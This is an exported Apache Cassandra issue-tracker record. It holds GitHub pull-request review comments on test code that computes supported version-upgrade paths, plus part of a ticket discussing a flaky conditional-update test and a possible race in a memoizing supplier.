+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.utils;
+
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.SortedSet;
+import java.util.TreeSet;
+import java.util.function.Consumer;
+
+import com.google.common.collect.ImmutableMap;
+import com.google.common.collect.ImmutableSet;
+import com.google.common.collect.Ordering;
+
+/**
+ * A directed graph. Main usage is the {@link #findPaths(Object, Object)} method which is used to find all paths between
+ * 2 vertices.
+ */
+public class SimpleGraph<V>
+{
+    private final ImmutableMap<V, ImmutableSet<V>> edges;
+
+    private SimpleGraph(ImmutableMap<V, ImmutableSet<V>> edges)
+    {
+        if (edges == null || edges.isEmpty())
+            throw new AssertionError(""Edges empty"");
+        this.edges = edges;
+    }
+
+    public static <T> SimpleGraph<T> of(T... values)

Review Comment:
   IMO pairs don't improve things, as it would be simpler to work with the builder directly... I can always switch back to builder



;01/Jun/22 18:03;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887155479


##########
test/unit/org/apache/cassandra/utils/SimpleGraph.java:
##########
@@ -0,0 +1,135 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.utils;
+
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.SortedSet;
+import java.util.TreeSet;
+import java.util.function.Consumer;
+
+import com.google.common.collect.ImmutableMap;
+import com.google.common.collect.ImmutableSet;
+import com.google.common.collect.Ordering;
+
+/**
+ * A directed graph. Main usage is the {@link #findPaths(Object, Object)} method which is used to find all paths between
+ * 2 vertices.
+ */
+public class SimpleGraph<V>
+{
+    private final ImmutableMap<V, ImmutableSet<V>> edges;
+
+    private SimpleGraph(ImmutableMap<V, ImmutableSet<V>> edges)
+    {
+        if (edges == null || edges.isEmpty())
+            throw new AssertionError(""Edges empty"");
+        this.edges = edges;
+    }
+
+    public static <T> SimpleGraph<T> of(T... values)

Review Comment:
   moved this to SimpleGraphTest to keep that code smaller, and switched upgrade base to use builder + addEdge



;01/Jun/22 18:06;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887157517


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -153,20 +184,40 @@ public TestCase upgradesFrom(Semver from)
         /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
+            List<TestVersions> upgrade = new ArrayList<>();
+            List<Version> toVersions = Collections.singletonList(versions.getLatest(to));
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, to))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), toVersions));
+            }
+            if (CURRENT.equals(from))
+            {
+                // when from=CURRENT we want to test upgrading to more recent versions rather than just upgrading
+                // from previous versions; so special case that
+                for (Semver end : vertices.subSet(from, false, to, false)) //from->to included above, so don't need to readd
                 {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+                    if (SUPPORTED_UPGRADE_PATHS.hasEdge(CURRENT, end))
+                        upgrade.add(new TestVersions(versions.getLatest(CURRENT), Collections.singletonList(versions.getLatest(end))));
+                }
+            }

Review Comment:
   doesn't work given the API, it only works for the current usage...
   
   if CURRENT=4.2, from=3.0, and to=4.0, then CURRENT isn't involved in the test (which the API allows and some historically tests were doing...)...



;01/Jun/22 18:08;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887157517


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -153,20 +184,40 @@ public TestCase upgradesFrom(Semver from)
         /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
+            List<TestVersions> upgrade = new ArrayList<>();
+            List<Version> toVersions = Collections.singletonList(versions.getLatest(to));
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, to))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), toVersions));
+            }
+            if (CURRENT.equals(from))
+            {
+                // when from=CURRENT we want to test upgrading to more recent versions rather than just upgrading
+                // from previous versions; so special case that
+                for (Semver end : vertices.subSet(from, false, to, false)) //from->to included above, so don't need to readd
                 {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+                    if (SUPPORTED_UPGRADE_PATHS.hasEdge(CURRENT, end))
+                        upgrade.add(new TestVersions(versions.getLatest(CURRENT), Collections.singletonList(versions.getLatest(end))));
+                }
+            }

Review Comment:
   doesn't work given the API and would logically break `org.apache.cassandra.distributed.upgrade.MixedModeFrom3LoggedBatchTest`
   
   if CURRENT=4.2, from=3.0, and to=4.0, then CURRENT isn't involved in the test (which the API allows and some tests are doing...)...
   
   this logic would have `3.0 -> 4.0` do the following
   
   ```
   3.0 -> 4.2
   3.11 -> 4.2
   4.0 -> 4.2
   ```



;01/Jun/22 18:11;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887217722


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -153,20 +184,40 @@ public TestCase upgradesFrom(Semver from)
         /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
+            List<TestVersions> upgrade = new ArrayList<>();
+            List<Version> toVersions = Collections.singletonList(versions.getLatest(to));
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, to))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), toVersions));
+            }
+            if (CURRENT.equals(from))
+            {
+                // when from=CURRENT we want to test upgrading to more recent versions rather than just upgrading
+                // from previous versions; so special case that
+                for (Semver end : vertices.subSet(from, false, to, false)) //from->to included above, so don't need to readd
                 {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+                    if (SUPPORTED_UPGRADE_PATHS.hasEdge(CURRENT, end))
+                        upgrade.add(new TestVersions(versions.getLatest(CURRENT), Collections.singletonList(versions.getLatest(end))));
+                }
+            }

Review Comment:
   moved this convo back to slack as there isn't agreement on the desired semantic... blocked until we agree https://the-asf.slack.com/archives/CK23JSY2K/p1654110195106499?thread_ts=1653327219.358099&cid=CK23JSY2K



;01/Jun/22 19:21;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887217722


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -153,20 +184,40 @@ public TestCase upgradesFrom(Semver from)
         /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
+            List<TestVersions> upgrade = new ArrayList<>();
+            List<Version> toVersions = Collections.singletonList(versions.getLatest(to));
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, to))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), toVersions));
+            }
+            if (CURRENT.equals(from))
+            {
+                // when from=CURRENT we want to test upgrading to more recent versions rather than just upgrading
+                // from previous versions; so special case that
+                for (Semver end : vertices.subSet(from, false, to, false)) //from->to included above, so don't need to readd
                 {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+                    if (SUPPORTED_UPGRADE_PATHS.hasEdge(CURRENT, end))
+                        upgrade.add(new TestVersions(versions.getLatest(CURRENT), Collections.singletonList(versions.getLatest(end))));
+                }
+            }

Review Comment:
   moved this convo back to slack as there isn't agreement on the desired semantic... blocked until we agree https://the-asf.slack.com/archives/CK23JSY2K/p1654110195106499?thread_ts=1653327219.358099&cid=CK23JSY2K
   
   this is getting more complex, so need feedback from all.  What ""should"" be the test cases for the following cases
   * CURRENT=3.0, from=3.0, to=4.2
   * CURRENT=4.0, from=3.0, to=4.2
   * CURRENT=4.2, from=3.0, to=4.2



;01/Jun/22 19:21;githubbot;600","jonmeredith commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887317149


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -145,28 +179,77 @@ public TestCase nodes(int nodeCount)
         }
 
         /** performs all supported upgrade paths that exist in between from and CURRENT (inclusive) **/
-        public TestCase upgradesFrom(Semver from)
+        public TestCase upgradesToCurrentFrom(Semver from)
+        {
+            return upgradesTo(from, CURRENT);
+        }
+
+        /**
+         * performs all supported upgrade paths to the ""to"" target; example
+         * {@code upgradesTo(3.0, 4.0); // produces: 3.0 -> 4.0, 3.11 -> 4.0}
+         */
+        public TestCase upgradesTo(Semver from, Semver to)
+        {
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, true, to, false))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), Collections.singletonList(versions.getLatest(to))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
+        }
+
+        /**
+         * performs all supported upgrade paths from the ""from"" target; example
+         * {@code upgradesFrom(4.0, 4.2); // produces: 4.0 -> 4.1, 4.0 -> 4.2}
+         */
+        public TestCase upgradesFrom(Semver from, Semver to)
         {
-            return upgrades(from, CURRENT);
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver end : vertices.subSet(from, false, to, true))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(from, end))
+                    upgrade.add(new TestVersions(versions.getLatest(from), Collections.singletonList(versions.getLatest(end))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
         }
 
-        /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
+        /**
+         * performs all supported upgrade paths that exist in between from and to that include the current version.
+         * This call is equivilent to calling {@code upgradesTo(from, CURRENT).upgradesFrom(CURRENT, to)}.
+         **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
-                {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+            Assume.assumeTrue(""Unable to do upgrades("" + from + "", "" + to + ""); does not contain CURRENT="" + CURRENT, contains(from, to, CURRENT));

Review Comment:
   worth assuming that `from < to`?



;01/Jun/22 21:28;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887319148


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -145,28 +179,77 @@ public TestCase nodes(int nodeCount)
         }
 
         /** performs all supported upgrade paths that exist in between from and CURRENT (inclusive) **/
-        public TestCase upgradesFrom(Semver from)
+        public TestCase upgradesToCurrentFrom(Semver from)
+        {
+            return upgradesTo(from, CURRENT);
+        }
+
+        /**
+         * performs all supported upgrade paths to the ""to"" target; example
+         * {@code upgradesTo(3.0, 4.0); // produces: 3.0 -> 4.0, 3.11 -> 4.0}
+         */
+        public TestCase upgradesTo(Semver from, Semver to)
+        {
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, true, to, false))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), Collections.singletonList(versions.getLatest(to))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
+        }
+
+        /**
+         * performs all supported upgrade paths from the ""from"" target; example
+         * {@code upgradesFrom(4.0, 4.2); // produces: 4.0 -> 4.1, 4.0 -> 4.2}
+         */
+        public TestCase upgradesFrom(Semver from, Semver to)
         {
-            return upgrades(from, CURRENT);
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver end : vertices.subSet(from, false, to, true))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(from, end))
+                    upgrade.add(new TestVersions(versions.getLatest(from), Collections.singletonList(versions.getLatest(end))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
         }
 
-        /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
+        /**
+         * performs all supported upgrade paths that exist in between from and to that include the current version.
+         * This call is equivilent to calling {@code upgradesTo(from, CURRENT).upgradesFrom(CURRENT, to)}.
+         **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
-                {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+            Assume.assumeTrue(""Unable to do upgrades("" + from + "", "" + to + ""); does not contain CURRENT="" + CURRENT, contains(from, to, CURRENT));

Review Comment:
   `assume` causes tests to skip, `from < to` is a bug and should fail; currently the subSet call checks that and fails



;01/Jun/22 21:31;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887321257


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -145,28 +179,77 @@ public TestCase nodes(int nodeCount)
         }
 
         /** performs all supported upgrade paths that exist in between from and CURRENT (inclusive) **/
-        public TestCase upgradesFrom(Semver from)
+        public TestCase upgradesToCurrentFrom(Semver from)
+        {
+            return upgradesTo(from, CURRENT);
+        }
+
+        /**
+         * performs all supported upgrade paths to the ""to"" target; example
+         * {@code upgradesTo(3.0, 4.0); // produces: 3.0 -> 4.0, 3.11 -> 4.0}
+         */
+        public TestCase upgradesTo(Semver from, Semver to)
+        {
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, true, to, false))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), Collections.singletonList(versions.getLatest(to))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
+        }
+
+        /**
+         * performs all supported upgrade paths from the ""from"" target; example
+         * {@code upgradesFrom(4.0, 4.2); // produces: 4.0 -> 4.1, 4.0 -> 4.2}
+         */
+        public TestCase upgradesFrom(Semver from, Semver to)
         {
-            return upgrades(from, CURRENT);
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver end : vertices.subSet(from, false, to, true))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(from, end))
+                    upgrade.add(new TestVersions(versions.getLatest(from), Collections.singletonList(versions.getLatest(end))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
         }
 
-        /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
+        /**
+         * performs all supported upgrade paths that exist in between from and to that include the current version.
+         * This call is equivilent to calling {@code upgradesTo(from, CURRENT).upgradesFrom(CURRENT, to)}.
+         **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
-                {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+            Assume.assumeTrue(""Unable to do upgrades("" + from + "", "" + to + ""); does not contain CURRENT="" + CURRENT, contains(from, to, CURRENT));

Review Comment:
   `java.util.TreeMap.NavigableSubMap#NavigableSubMap` blocks this
   
   ```
   if (!fromStart && !toEnd) {
                   if (m.compare(lo, hi) > 0)
                       throw new IllegalArgumentException(""fromKey > toKey"");
   ```



;01/Jun/22 21:34;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887319148


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -145,28 +179,77 @@ public TestCase nodes(int nodeCount)
         }
 
         /** performs all supported upgrade paths that exist in between from and CURRENT (inclusive) **/
-        public TestCase upgradesFrom(Semver from)
+        public TestCase upgradesToCurrentFrom(Semver from)
+        {
+            return upgradesTo(from, CURRENT);
+        }
+
+        /**
+         * performs all supported upgrade paths to the ""to"" target; example
+         * {@code upgradesTo(3.0, 4.0); // produces: 3.0 -> 4.0, 3.11 -> 4.0}
+         */
+        public TestCase upgradesTo(Semver from, Semver to)
+        {
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, true, to, false))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), Collections.singletonList(versions.getLatest(to))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
+        }
+
+        /**
+         * performs all supported upgrade paths from the ""from"" target; example
+         * {@code upgradesFrom(4.0, 4.2); // produces: 4.0 -> 4.1, 4.0 -> 4.2}
+         */
+        public TestCase upgradesFrom(Semver from, Semver to)
         {
-            return upgrades(from, CURRENT);
+            List<TestVersions> upgrade = new ArrayList<>();
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver end : vertices.subSet(from, false, to, true))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(from, end))
+                    upgrade.add(new TestVersions(versions.getLatest(from), Collections.singletonList(versions.getLatest(end))));
+            }
+            logger.info(""Adding upgrades of\n{}"", upgrade.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrade);
+            return this;
         }
 
-        /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
+        /**
+         * performs all supported upgrade paths that exist in between from and to that include the current version.
+         * This call is equivilent to calling {@code upgradesTo(from, CURRENT).upgradesFrom(CURRENT, to)}.
+         **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
-                {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+            Assume.assumeTrue(""Unable to do upgrades("" + from + "", "" + to + ""); does not contain CURRENT="" + CURRENT, contains(from, to, CURRENT));

Review Comment:
   `assume` causes tests to skip, `from > to` is a bug and should fail; currently the subSet call checks that and fails



;01/Jun/22 21:35;githubbot;600","smiklosovic closed pull request #1642: CASSANDRA-17656: jvm-dtest upgrade tests run all supported pairs of upgrades between from/to but does not actually test all patches from/to
URL: https://github.com/apache/cassandra/pull/1642


;17/Jun/22 07:35;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,15600,,,0,15600,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17636,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> API / Semantic Implementation,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 06 20:45:47 UTC 2022,,,,,,,All,,,,"0|z12mao:",9223372036854775807,,,,jmeredithco,mck,,,Critical,,NA,,https://github.com/apache/cassandra/commit/b7cc21516cfc5f95a7df4d86badac8b4195552a4,,,,,,,,,run tests,,,,,"25/May/22 18:34;jonmeredith;+1;;;","25/May/22 21:14;dcapwell;waiting on [~mck] to confirm he is cool with this before committing.;;;","26/May/22 18:03;dcapwell;[~mck], [~jonmeredith], and I agreed that we will keep the pair-wise upgrade logic, but bound the tests to those that upgrade to CURRENT, so the following is what happens on trunk with v3.0

{code}
3.0.28 -> [4.2]
3.11.14 -> [4.2]
4.0.5 -> [4.2]
4.1-alpha1 -> [4.2]
{code};;;","26/May/22 18:07;dcapwell;in order to test the longer paths (3.0 -> 3.11 -> 4.0 -> 4.1 -> trunk) we need to improve how CI works due to the fact that these tests would be scoped to a single file/jvm which can overload the JVM and cause large delays (30s test taking 8m);;;","01/Jun/22 21:26;dcapwell;think we came to agreement!!!  upgrades method now does the following

{code}
upgradesTo(from, CURRENT);
upgradesFrom(CURRENT, to);
{code}

and added the 2 new methods upgradesTo (upgrade all paths where from changes but to is fixed) and upgradesFrom (upgrade all paths where too changes but from is fixed); this allows test authors to switch back to older logic if desired, but keeps the default focused on CURRENT;;;","02/Jun/22 19:21;dcapwell;[~jonmeredith] and [~mck] +1ed in Slack;;;","06/Jun/22 20:45;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17656-trunk-24F0D720-D07A-445C-A818-8C7FE50C3D84]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17656-trunk-24F0D720-D07A-445C-A818-8C7FE50C3D84]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1770/]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.testConditionalUpdate[0: clusterMinVersion=3.0],CASSANDRA-17653,13446352,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,brandon.williams,brandon.williams,23/May/22 11:06,11/Apr/23 05:16,13/Jul/23 08:40,11/Jul/22 07:52,4.1.x,4.1-beta1,,,,,Test/dtest/java,,,,0,,"{code}
junit.framework.AssertionFailedError
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.lambda$data$0(InsertUpdateIfConditionTest.java:64)
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.beforeSetup(InsertUpdateIfConditionTest.java:90)
	at org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.before(InsertUpdateIfConditionTest.java:84)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
{code}

https://ci-cassandra.apache.org/job/Cassandra-4.1/34/testReport/org.apache.cassandra.cql3.validation.operations/InsertUpdateIfConditionTest/testConditionalUpdate_0__clusterMinVersion_3_0__3/",,adelapena,bereng,blerer,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-18393,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Apr 11 05:16:47 UTC 2023,,,,,,,All,,,,"0|z12lo8:",9223372036854775807,,,,b.lerer@gmail.com,bereng,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/1d80dd008677e0084b1530295207a568853badee,,,,,,,,,See PR,,,,,"31/May/22 17:40;e.dimitrova;I didn't manage to reproduce it.Tried the single test in a loop, the the whole class. I got a few failures but from other test cases in the same class - https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17653-4.1&filter=all;;;","03/Jun/22 09:31;blerer;The problem looks like a setup issue with the Gossiper.;;;","08/Jun/22 09:37;bereng;I have tried to repro with no luck. But I notied you [~e.dimitrova] did actually manage to repro on the j11 section. That being said it was 1 in 30K! Being a parametrized class, which can easily have runs cross-talk I don't think this is one should be a blocker for 4.1. I would leave it for 4.1.x instead unless we see it keeps coming back. Wdyt?;;;","08/Jun/22 13:34;blerer;In my opinion we should improve the assertion so that we have a clear idea of the gossiper state if it ever fail again at the same place and close the ticket with cannot reproduce.;;;","09/Jun/22 07:12;bereng;That's actually a good idea. I've pushed one proposal.;;;","21/Jun/22 01:29;e.dimitrova;[~Bereng] I think your PR was not linked successfully, can you try again, please? ;;;","21/Jun/22 05:15;bereng;Ops! linked;;;","21/Jun/22 12:47;blerer;I had some look at the patch and considering that the issue might be a race condition requesting the message and checking the value in 2 separate calls can lead us to the wrong direction if the 2 calls return different results.

I also had a look at the code and it seems to me that there are some problems in {{ExpiringMemoizingSupplier}} code.
* {{expire}} is setting {{expirationNanos}} outside of a {{synchronize}} block which allow for concurrent modification as another thread might be modifying it within the {{get}} method.
* within the synchronized block in the {{get}} method {{expirationNanos}} will always be equals to {{ nanos}} as it cannot be equals to zero.;;;","22/Jun/22 07:40;bereng;bq. can lead us to the wrong direction if the 2 calls return different results.

